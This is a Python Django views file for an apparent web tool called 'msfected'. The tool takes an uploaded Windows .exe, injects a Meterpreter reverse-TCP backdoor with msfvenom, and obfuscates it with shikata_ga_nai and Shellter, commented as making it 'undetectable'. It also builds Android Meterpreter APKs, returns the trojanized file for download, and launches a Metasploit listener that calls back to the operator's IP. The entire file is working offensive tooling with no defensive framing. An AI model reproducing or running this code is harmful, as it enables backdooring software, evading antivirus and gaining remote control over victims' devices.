import shutil
from django.shortcuts import render
from django.http import HttpResponse, HttpResponseRedirect, FileResponse
from .forms import UploadFileForm
from django.utils.encoding import smart_str
import os, socket, fcntl, struct


def get_ip(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,
        struct.pack('256s', ifname[:15])
    )[20:24])


def save_file(file):
    print('[* Saving file *]')
    path = 'msfected/static/uploads/'
    ext = file.name.split('.')[-1]

    try:
        if ext == 'exe':
            with open(path + file.name, 'wb+') as temp:
                for chunk in file.chunks():
                    temp.write(chunk)
            return True

        # elif ext == 'apk':
        #     with open(path + file.name, 'wb+') as temp:
        #         for chunk in file.chunks():
        #             temp.write(chunk)
        #     return True

        else:
            return False
    except:
        print('Exception saving file')


def infect_file(file, ip):
    print('[* Injecting file *]')
    ext = file.name.split('.')[-1]

    try:
        if ext == 'exe':
            cmd = 'msfvenom -a x86 --platform windows -x {0}{1} -k -p windows/meterpreter/reverse_tcp ' \
                  'lhost={2} lport=4444 -e x86/shikata_ga_nai -i 3 -b "\\x00" -f exe ' \
                  '-o ~/PycharmProjects/msfected/msfected/msfected/static/payloads/{1}' \
                .format('~/PycharmProjects/msfected/msfected/msfected/static/uploads/', file.name, ip)
            os.system(cmd)
            # To make payloaded file undetectable
            os.system('shellter -a -f {0} -s -p meterpreter_reverse_tcp --lhost {1} --port 4444'
                      .format('/root/PycharmProjects/msfected/msfected/msfected/static/uploads/%s' % file.name, ip))
            return True

        elif ext == 'apk':
            os.system('msfvenom -p android/meterpreter/reverse_tcp '
                      'lhost={2} lport=4444 -o ~/PycharmProjects/msfected/msfected/msfected/static/payloads/{1}'
                      .format('~/PycharmProjects/msfected/msfected/msfected/static/uploads/', file.name, ip))
            return True
    except:
        print('Exception infecting file')


def clear():
    print('[* Clearing cache *]')
    os.chdir('msfected/static/')
    shutil.rmtree('payloads/')
    shutil.rmtree('uploads/')
    os.mkdir('payloads/')
    os.mkdir('uploads/')


def send_file(file, path):
    try:
        print('[* Sending file *]')
        f = open(path + file.name, 'rb')
        response = FileResponse(f)
        clear()
        return response
    except:
        print('Exception sending file')


def run_listener(ip):
    try:
        print('[* Runing listener *]')
        os.system('msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; '
                  'set lhost {0}; set lport 4444; exploit;"'.format(ip))
    except:
        print('Exception running msf listener')


def combiner(request):
    if request.method == 'POST':
        form = UploadFileForm(request.POST, request.FILES)

        if form.is_valid():
            file = request.FILES['file']
            ip = get_ip(b'wlan0')

            if save_file(file):
                if infect_file(file, ip):
                    return send_file(file, 'msfected/static/payloads/')
                else:
                    msg = 'Error infecting file!'
            else:
                msg = 'File type not supported!'

            return render(request, 'index.html', {'msg': msg, 'form': form})
    else:
        form = UploadFileForm()
    return render(request, 'index.html', {'form': form})
